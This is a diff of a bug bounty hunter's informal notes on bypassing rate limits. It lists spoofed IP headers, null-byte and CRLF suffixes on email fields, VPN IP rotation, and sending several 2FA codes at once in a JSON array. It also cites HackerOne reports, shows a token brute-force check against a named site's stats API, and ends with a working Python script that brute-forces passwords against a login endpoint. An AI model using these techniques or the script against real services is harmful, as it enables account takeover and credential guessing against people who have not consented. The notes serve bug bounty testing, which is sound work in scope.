@@ -1,17 +1,56 @@
 Day 1
 
+
+Rate Limit Bypass
+
+Rate limit bypass:
+Add header/s with request
+X-Originating-IP: IP
+X-Forwarded-For: IP
+X-Remote-IP: IP
+X-Remote-Addr: IP
+X-Client-IP: IP
+X-Host: IP
+X-Forwared-Host: IP
+Rate Limiting Bypass 
+IP Rotation --> Sending new ip's 
+Null byte -- %00,%0d%0a,%09
+exapmple:email:test5119@yopmail.com%00
+4. X-Forwarded-For: IP 
+ex:X-Forwarded-For: 127.0.0.1
+5. Double X forward option 
+ex: X-Forwarded-For:
+X-Forwarded-For:127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.01
+X-Host: 12.0.0.1
+X-Forwared-Host: 127.0.0.1
+
+If bypass successful, & after a while blocking request again. Increment the last octate
+
 Rate Limit
 Before scan program please read scope ,may be rate limite is out of scope or email bombing
 
 before run scan use fack email id or user name and burtforce , if after 10 or 6 request you are not block then you can do attack , until find ratelimite bypass
 
+ use open vpn for blocking your IP its Free(go to VPN Book all information is there)
+ 
 1)login page 
 2) password reset page
 3)password reset page (user enum)
-4) rooms ,chat , meeting,comment,game rooms,create folder,create user,create list,send mail,send massage,upload,delete account,
+4) rooms ,chat , meeting,comment,game rooms,create folder,create user,create list,send mail,send massage,upload,delete account,promo code,
 
 
+check in perameter  =[8127410000,8317030000,...]& so
+check token brutforce .  Stats api token can be generated at https://chaturbate.com/statsapi/authtoken/
+https://chaturbate.com/statsapi/?username=hackeronetestchat&token=**vulnerable**
 
+ I've used my profile and and my token to check brute force
+ 
+  If rate limit reached and blocked you then add X-Forwarded-For:127.0.0.1 header. This will easily reset rate limit. You can change IP address to 127.0.0.2 ,3,4,5,6 every time website blocked you.
 
 https://hackerone.com/reports/751604 Bounty	$500
 
@@ -138,3 +177,63 @@ SUGGESTED FIX
 
     Apply rate limiting
     (more complicated) Add some sort of : "To stop recieving SMS messages reply STOP"
+	
+*************************************************************************************************************************************
+****************************************************************************************************************************************
+
+
+
+https://hackerone.com/reports/170310
+
+1)Put %00 behind then email id or just black space it will work
+
+1 add %00 at the end of mail in intruder whenever error 429 comes 
+Or %2e,%0d,%0a
+2 add X-Forwarded-For: 127.0.0.1
+If  rate limit is based on ip use ip rotator burp extention 
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////
+applications that uses JSON sometimes allows for multientry check, for incense 2FA code will be as {“code”:111}
+
+if there was limited tries just give multiple values and If one was corrected access will be granted!
+
+Ex: {“code”:[222,333]}
+
+script python change what you want 
+python3
+```
+import requests
+import time
+
+with open('passwords list path', 'r') as passwords:
+    passwd_index = 0
+    for passwd in passwords:
+        passwd = passwd.split('\n')[0]
+        HEADERS = {
+	        'Host': 'lgtm-com.pentesting.semmle.net',
+	        'Content-Type': 'application/x-www-form-urlencoded',
+	        'Content-Length': '238',
+	        'Cookie': ''
+        }
+
+        DATA = {
+	        'email': 'your valid email',
+	        'password': passwd,
+	        'nonce': '',
+	        'apiVersion': 'b5b3337fa392c83c27f4e05efc4ccbcb2dcf6cbf'
+
+        }
+
+        login = requests.post('https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/login', headers=HEADERS, data=DATA)
+        if login.status_code == 200:
+            print(f'[#] {passwd}')
+            break
+        elif login.status_code == 400:
+            print('[!] sleep 60s')
+            time.sleep(60)
+        elif login.status_code == 401:
+            print(f'[{passwd_index}] {passwd}')
+            time.sleep(5)
+        else:
+            print(login.status_code)
+        passwd_index += 1
